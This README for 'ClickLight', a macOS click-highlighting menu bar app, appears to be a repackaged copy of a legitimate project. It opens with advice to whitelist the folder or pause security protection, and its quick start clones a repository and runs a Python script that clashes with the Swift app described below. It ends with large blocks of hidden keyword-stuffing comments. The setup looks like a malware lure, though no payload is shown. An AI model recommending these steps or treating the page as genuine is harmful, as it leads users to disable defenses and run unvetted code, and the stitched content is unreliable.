# ClickLight


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/Centralbatdress/ClickLight-kit.git
cd ClickLight-kit
python run.py
```


A small macOS menu bar app that highlights your clicks during live demos, screen sharing, UX reviews, and other moments where people need to follow what you are doing.

Screen recorders like Screen Studio and CleanShot can add click effects after the fact. ClickLight is for the live moment itself, when you need the audience to see exactly when you clicked without interrupting your flow.

## Demo

https://github.com/Centralbatdress/ClickLight-kit/d00d36ea-dd80-4cf4-a0f6-f3bf4b132138

## Use Cases

- Live product demos where viewers need to follow exactly what you clicked
- UX reviews where the delay between click and response matters (the original motivation for ClickLight)
- Bug reports where a recording should show both the action and the app behavior
- Tutorials, workshops, and conference talks where pointer movement alone is easy to miss
- Pairing with a larger macOS pointer so clicks stay visible in live demos and recordings


## Features

- Click highlights across macOS apps
- Separate visuals for press, release, right-click, and drag
- Optional laser pointer mode with fading freehand strokes while dragging
- Optional live keyboard shortcut display pinned to the bottom of the screen by default, with pointer-following placement and sizes through XL available
- Local daily click activity chart with a resettable seven-day history
- Optional daily click count in the menu bar
- Dedicated settings window with presets, sliders, optional menu sections, and a sidebar preview pad with Randomize
- Custom color picker in Settings
- Menu-bar quick presets for size, duration, intensity, and color
- Customizable status-bar menu sections for hiding optional controls you do not use
- One default ClickLight toggle shortcut, with optional shortcuts for other actions
- Optional compact menu-bar icon
- Test pulse for verifying overlay behavior
- Native Swift/AppKit app
- No Xcode project required

## Keyboard Shortcuts

ClickLight includes one default global shortcut for quick toggles during demos. Other actions can be assigned shortcuts in Settings if you want them.

| Shortcut | Action |
| --- | --- |
| `Control + Option + Command + L` | Toggle ClickLight on/off |
| Not set by default | Toggle Laser Pointer Mode |
| Not set by default | Toggle Press |
| Not set by default | Toggle Release |
| Not set by default | Toggle Right Click |
| Not set by default | Toggle Middle Click |
| Not set by default | Toggle Drag |
| Not set by default | Randomize Colors |
| Not set by default | Toggle Live Keyboard Shortcuts |

All shortcuts can be changed or disabled in Settings.

## Permissions

ClickLight requires Accessibility permission to detect clicks outside its own menu-bar app. You will be prompted on first launch, or grant it manually in:

**System Settings -> Privacy & Security -> Accessibility**

The optional Live Keyboard Shortcuts display additionally requires **Input Monitoring**, because macOS protects keyboard input separately from mouse clicks.

After enabling permission, quit ClickLight from the menu bar and reopen it.

Tip: for recorded demos or presentations, pair ClickLight with a larger macOS pointer in **System Settings -> Accessibility -> Display -> Pointer**.

## Modify It

ClickLight is personal software: one small presentation annoyance, fixed directly. The project is intentionally small so you or an agent can change it without much ceremony.

Start with [Local Development](docs/LOCAL_DEVELOPMENT.md).

## Contributing

Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, testing, and pull request guidance. Please report security issues privately as described in [SECURITY.md](SECURITY.md).

## Releasing

Releases are signed, notarized, published to GitHub Releases, and followed by a reviewed metadata pull request for Homebrew and Sparkle updates.

See [Releasing](docs/RELEASING.md). What's new is tracked in [GitHub Releases]().

## Uninstall

```bash
brew uninstall --cask clicklight
```

To remove ClickLight preferences too:

```bash
brew uninstall --cask --zap clicklight
```

> **Manual uninstall**
> If you installed ClickLight manually from source, use [Remove Manual Install](docs/MANUAL_INSTALL.md#remove-manual-install).

## License

MIT. See [LICENSE](LICENSE).


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- ClickLight-kit - tool utility software - download install setup -->
<!-- secure ClickLight-kit web | wiki ClickLight-kit tracker | ClickLight-kit copy | ClickLight-kit scanner | build reliable ClickLight-kit | ClickLight-kit extension | how to setup ClickLight-kit tracker | advanced ClickLight-kit library | online ClickLight-kit | compile ClickLight-kit tracker | modular ClickLight-kit engine | lightweight ClickLight-kit | guide ClickLight-kit creator | how to build ClickLight-kit generator | stable ClickLight-kit decoder | ClickLight kit book | run on windows ClickLight-kit converter | advanced ClickLight-kit service | download for windows ClickLight-kit extractor | customizable ClickLight-kit | ClickLight kit kubernetes | macos github ClickLight-kit | tar.gz ClickLight-kit sdk | online ClickLight-kit tracker | open ClickLight-kit web | source code ClickLight-kit monitor | debian ClickLight-kit checker | example ClickLight-kit converter | offline ClickLight-kit uploader | macos ClickLight-kit extractor | minimal ClickLight-kit replacement | install ClickLight-kit wrapper | example ClickLight-kit downloader | start customizable ClickLight-kit library | tutorial ClickLight-kit software | simple ClickLight-kit port | is ClickLight kit safe | use ClickLight-kit | native ClickLight-kit sdk | run ClickLight-kit application | ClickLight kit ci cd | run on linux ClickLight-kit | guide ClickLight-kit viewer | ClickLight-kit framework | fast ClickLight-kit debugger | linux ClickLight-kit checker | run on mac modern ClickLight-kit | how to install ClickLight-kit framework | getting started ClickLight-kit sdk | how to use ClickLight-kit sdk -->
<!-- ClickLight-kit port | get ClickLight-kit plugin | extensible ClickLight-kit framework | tutorial ClickLight-kit checker | macos native ClickLight-kit | ClickLight kit documentation | quick start ClickLight-kit desktop | how to download ClickLight-kit | ClickLight-kit package | ClickLight-kit library | tutorial ClickLight-kit package | download for linux ClickLight-kit logger | source code ClickLight-kit tool | guide ClickLight-kit builder | documentation ClickLight-kit | easy ClickLight-kit program | ClickLight kit test | arch ClickLight-kit mirror | run on windows powerful ClickLight-kit wrapper | free ClickLight-kit | free ClickLight-kit replacement | github ClickLight-kit compressor | ubuntu ClickLight-kit downloader | top ClickLight kit | getting started ClickLight-kit framework | production ready ClickLight-kit plugin | install ClickLight-kit gui | macos offline ClickLight-kit monitor | minimal ClickLight-kit extension | ClickLight kit handbook | run on mac customizable ClickLight-kit | run on windows ClickLight-kit server | how to download ClickLight-kit library | compile secure ClickLight-kit | run on linux ClickLight-kit service | 2026 ClickLight-kit decoder | ClickLight kit devops | windows ClickLight-kit addon | latest version ClickLight-kit addon | latest version ClickLight-kit program | open ClickLight-kit viewer | windows ClickLight-kit | source code lightweight ClickLight-kit app | how to configure ClickLight-kit creator | deploy ClickLight-kit viewer | how to use ClickLight-kit service | ClickLight-kit builder | ClickLight kit workflow | how to download native ClickLight-kit | build ClickLight-kit uploader -->
<!-- customizable ClickLight-kit application | walkthrough ClickLight-kit server | open offline ClickLight-kit | windows online ClickLight-kit | get free ClickLight-kit | fast ClickLight-kit viewer | modern ClickLight-kit uploader | setup ClickLight-kit cli | ClickLight kit vs | ClickLight-kit downloader | github ClickLight-kit | production ready ClickLight-kit decoder | updated ClickLight-kit optimizer | how to download best ClickLight-kit | how to configure ClickLight-kit | modular ClickLight-kit client | quick start self hosted ClickLight-kit framework | new version ClickLight-kit uploader | updated cross platform ClickLight-kit port | sample ClickLight-kit plugin | ClickLight kit benchmark | ClickLight kit course | minimal ClickLight-kit program | how to use ClickLight-kit decoder | quick start lightweight ClickLight-kit | native ClickLight-kit replacement | run on mac ClickLight-kit port | easy ClickLight-kit framework | ClickLight kit workshop | install ClickLight-kit replacement | ClickLight kit alternative | centos reliable ClickLight-kit uploader | run on linux ClickLight-kit converter | how to setup stable ClickLight-kit | build ClickLight-kit generator | arch high performance ClickLight-kit | ClickLight-kit decoder | download for linux ClickLight-kit downloader | ClickLight-kit cli | easy ClickLight-kit reader | best ClickLight-kit | how to run ClickLight-kit app | low latency ClickLight-kit editor | how to build ClickLight-kit mirror | download for linux ClickLight-kit utility | setup ClickLight-kit | quick start ClickLight-kit web | setup lightweight ClickLight-kit | ClickLight-kit program | customizable ClickLight-kit compressor -->
<!-- wiki ClickLight-kit compressor | configure cross platform ClickLight-kit framework | ClickLight-kit utility | wiki modular ClickLight-kit viewer | how to configure ClickLight-kit editor | configurable ClickLight-kit platform | fedora ClickLight-kit compressor | zip ClickLight-kit builder | download for windows ClickLight-kit api | git clone ClickLight-kit compressor | online ClickLight-kit extension | open high performance ClickLight-kit debugger | stable ClickLight-kit | how to download best ClickLight-kit decoder | getting started ClickLight-kit addon | docs ClickLight-kit server | run on mac ClickLight-kit web | native ClickLight-kit tracker | macos ClickLight-kit addon | execute ClickLight-kit creator | tutorial stable ClickLight-kit | arch ClickLight-kit parser | ClickLight kit tutorial | run on mac ClickLight-kit service | download for linux ClickLight-kit | extensible ClickLight-kit viewer | powerful ClickLight-kit client | extensible ClickLight-kit monitor | simple ClickLight-kit reader | install native ClickLight-kit | walkthrough ClickLight-kit cli | open source ClickLight-kit | ClickLight kit blog | updated native ClickLight-kit package | latest version powerful ClickLight-kit | tar.gz ClickLight-kit viewer | free ClickLight-kit builder | windows ClickLight-kit application | documentation github ClickLight-kit | macos ClickLight-kit | use ClickLight-kit parser | how to install ClickLight-kit package | ClickLight kit reddit | ClickLight kit support | use ClickLight-kit checker | is ClickLight kit legit | ClickLight-kit application | advanced ClickLight-kit tester | self hosted ClickLight-kit program | build ClickLight-kit utility -->
<!-- secure ClickLight-kit package | low latency ClickLight-kit utility | quickstart ClickLight-kit generator | documentation ClickLight-kit program | how to build ClickLight-kit gui | centos production ready ClickLight-kit package | production ready ClickLight-kit | free ClickLight-kit plugin | documentation ClickLight-kit tracker | ClickLight-kit binding | ClickLight-kit api | modern ClickLight-kit extractor | ClickLight-kit gui | secure ClickLight-kit parser | how to deploy ClickLight-kit | ClickLight kit cloud | install ClickLight-kit | powerful ClickLight-kit generator | github ClickLight-kit software | ClickLight-kit extractor | getting started ClickLight-kit | open open source ClickLight-kit clone | deploy ClickLight-kit application | beginner configurable ClickLight-kit | docs online ClickLight-kit | walkthrough ClickLight-kit | low latency ClickLight-kit web | git clone ClickLight-kit framework | production ready ClickLight-kit checker | advanced ClickLight-kit monitor | download advanced ClickLight-kit | free ClickLight-kit debugger | fast ClickLight-kit engine | modern ClickLight-kit plugin | open source ClickLight-kit logger | ubuntu ClickLight-kit creator | run on linux ClickLight-kit engine | beginner ClickLight-kit extractor | get ClickLight-kit tool | github ClickLight-kit server | git clone fast ClickLight-kit | quickstart ClickLight-kit viewer | simple ClickLight-kit logger | deploy ClickLight-kit web | configurable ClickLight-kit reader | quickstart modern ClickLight-kit | tutorial ClickLight-kit | examples ClickLight-kit package | docs best ClickLight-kit | lightweight ClickLight-kit gui -->
<!-- quick start ClickLight-kit generator | compile ClickLight-kit parser | arch ClickLight-kit program | guide low latency ClickLight-kit | quick start minimal ClickLight-kit | latest version ClickLight-kit server | offline ClickLight-kit compressor | sample ClickLight-kit | use easy ClickLight-kit | configure ClickLight-kit | how to deploy ClickLight-kit reader | docs ClickLight-kit | local ClickLight-kit clone | centos low latency ClickLight-kit | native ClickLight-kit downloader | download ClickLight-kit engine | ClickLight kit help | native ClickLight-kit checker | advanced ClickLight-kit | source code ClickLight-kit | beginner ClickLight-kit uploader | ubuntu ClickLight-kit program | ClickLight kit webinar | how to download ClickLight-kit viewer | open source ClickLight-kit service | fast ClickLight-kit service | centos ClickLight-kit clone | run on windows ClickLight-kit clone | open source ClickLight-kit module | ubuntu ClickLight-kit framework | simple ClickLight-kit platform | launch safe ClickLight-kit | execute ClickLight-kit port | production ready ClickLight-kit package | minimal ClickLight-kit parser | compile ClickLight-kit app | launch ClickLight-kit clone | ClickLight kit bug | updated ClickLight-kit | start lightweight ClickLight-kit package | advanced ClickLight-kit uploader | ClickLight-kit parser | quick start native ClickLight-kit | download for linux ClickLight-kit scanner | native ClickLight-kit validator | self hosted ClickLight-kit optimizer | how to download customizable ClickLight-kit | zip ClickLight-kit client | customizable ClickLight-kit program | free ClickLight-kit mobile -->
<!-- ClickLight-kit software | how to configure ClickLight-kit extractor | fedora minimal ClickLight-kit analyzer | modular ClickLight-kit extension | run on windows free ClickLight-kit clone | example ClickLight-kit utility | 2025 ClickLight-kit server | fast ClickLight-kit sdk | how to install ClickLight-kit mobile | run on windows ClickLight-kit | open ClickLight-kit decoder | free download ClickLight-kit binding | simple ClickLight-kit | free download ClickLight-kit utility | 2025 configurable ClickLight-kit | download for mac ClickLight-kit debugger | best ClickLight-kit software | linux ClickLight-kit | ClickLight-kit generator | how to setup ClickLight-kit | high performance ClickLight-kit sdk | updated open source ClickLight-kit | quick start ClickLight-kit addon | powerful ClickLight-kit replacement | native ClickLight-kit mobile | download for mac ClickLight-kit fork | ClickLight kit best practice | example production ready ClickLight-kit extractor | 2025 ClickLight-kit | production ready ClickLight-kit utility | safe ClickLight-kit uploader | wiki ClickLight-kit scanner | modular ClickLight-kit fork | documentation ClickLight-kit reader | deploy ClickLight-kit program | online ClickLight-kit mobile | production ready ClickLight-kit mobile | tar.gz ClickLight-kit mirror | git clone ClickLight-kit gui | ClickLight-kit editor | how to run ClickLight-kit builder | updated modern ClickLight-kit | how to setup ClickLight-kit platform | sample lightweight ClickLight-kit converter | cross platform ClickLight-kit creator | modular ClickLight-kit optimizer | powerful ClickLight-kit compressor | download for mac ClickLight-kit cli | tutorial ClickLight-kit builder | local ClickLight-kit tester -->
<!-- wiki ClickLight-kit | open ClickLight-kit reader | ClickLight-kit tool | powerful ClickLight-kit creator | walkthrough advanced ClickLight-kit | download for mac ClickLight-kit | docs ClickLight-kit builder | ClickLight kit demo | ClickLight-kit analyzer | simple ClickLight-kit validator | execute ClickLight-kit library | run advanced ClickLight-kit server | updated ClickLight-kit validator | customizable ClickLight-kit mirror | extensible ClickLight-kit server | getting started ClickLight-kit viewer | reliable ClickLight-kit parser | run on linux github ClickLight-kit client | linux powerful ClickLight-kit cli | download ClickLight-kit optimizer | configurable ClickLight-kit | download for mac ClickLight-kit extractor | ClickLight kit pipeline | self hosted ClickLight-kit alternative | download ClickLight-kit | fast ClickLight-kit validator | open source ClickLight-kit binding | how to setup simple ClickLight-kit | easy ClickLight-kit scanner | low latency ClickLight-kit tracker | start powerful ClickLight-kit | open source ClickLight-kit checker | github ClickLight-kit addon | how to run ClickLight-kit module | start ClickLight-kit validator | zip ClickLight-kit module | native ClickLight-kit | production ready ClickLight-kit framework | configurable ClickLight-kit addon | fast ClickLight-kit mirror | run on mac ClickLight-kit desktop | offline ClickLight-kit logger | zip ClickLight-kit tool | is ClickLight kit good | sample production ready ClickLight-kit tester | easy ClickLight-kit mobile | run on mac reliable ClickLight-kit | offline ClickLight-kit web | 2026 ClickLight-kit | offline ClickLight-kit extension -->
<!-- free download ClickLight-kit viewer | configure ClickLight-kit mirror | setup ClickLight-kit utility | ClickLight-kit mobile | guide ClickLight-kit | ClickLight kit saas | latest version stable ClickLight-kit platform | demo ClickLight-kit app | ClickLight-kit web | execute ClickLight-kit parser | how to run ClickLight-kit | git clone powerful ClickLight-kit extension | how to setup ClickLight-kit binding | ClickLight-kit platform | latest version high performance ClickLight-kit | how to deploy ClickLight-kit compressor | download for windows cross platform ClickLight-kit tracker | setup ClickLight-kit tool | examples ClickLight-kit | safe ClickLight-kit | windows ClickLight-kit compressor | self hosted ClickLight-kit plugin | new version ClickLight-kit service | docs ClickLight-kit service | ClickLight-kit wrapper | tar.gz ClickLight-kit decoder | docs ClickLight-kit web | minimal ClickLight-kit | how to configure offline ClickLight-kit | top ClickLight-kit compressor | run ClickLight-kit extension | run on windows ClickLight-kit monitor | ClickLight kit article | ClickLight-kit desktop | github ClickLight-kit binding | zip ClickLight-kit | quickstart ClickLight-kit cli | ClickLight-kit module | fedora ClickLight-kit tester | ClickLight kit reference | best ClickLight kit | run on linux reliable ClickLight-kit logger | cross platform ClickLight-kit app | advanced ClickLight-kit clone | centos ClickLight-kit scanner | guide ClickLight-kit debugger | native ClickLight-kit encoder | self hosted ClickLight-kit wrapper | demo ClickLight-kit downloader | ClickLight-kit mirror -->
<!-- modern ClickLight-kit analyzer | how to build ClickLight-kit library | modern ClickLight-kit program | launch ClickLight-kit | centos ClickLight-kit | compile lightweight ClickLight-kit | latest version ClickLight-kit | run on windows ClickLight-kit scanner | how to install secure ClickLight-kit | configurable ClickLight-kit tool | example ClickLight-kit client | setup local ClickLight-kit | ClickLight-kit creator | setup portable ClickLight-kit | best ClickLight-kit module | ClickLight-kit validator | ubuntu best ClickLight-kit | beginner github ClickLight-kit | reliable ClickLight-kit module | updated ClickLight-kit desktop | examples ClickLight-kit cli | modular ClickLight-kit | customizable ClickLight-kit logger | how to run ClickLight-kit parser | walkthrough online ClickLight-kit | examples ClickLight-kit copy | extensible ClickLight-kit clone | ClickLight-kit converter | local ClickLight-kit decoder | debian ClickLight-kit library | ClickLight kit cheat sheet | source code ClickLight-kit editor | free ClickLight-kit application | portable ClickLight-kit downloader | debian ClickLight-kit platform | windows free ClickLight-kit replacement | cross platform ClickLight-kit | macos ClickLight-kit alternative | deploy ClickLight-kit | lightweight ClickLight-kit debugger | open ClickLight-kit clone | offline ClickLight-kit gui | tar.gz ClickLight-kit software | lightweight ClickLight-kit mirror | fedora safe ClickLight-kit mobile | example ClickLight-kit | ClickLight kit example | download for linux ClickLight-kit reader | ClickLight kit guide | deploy ClickLight-kit reader -->

<!-- Last updated: 2026-06-09 16:17:43 -->
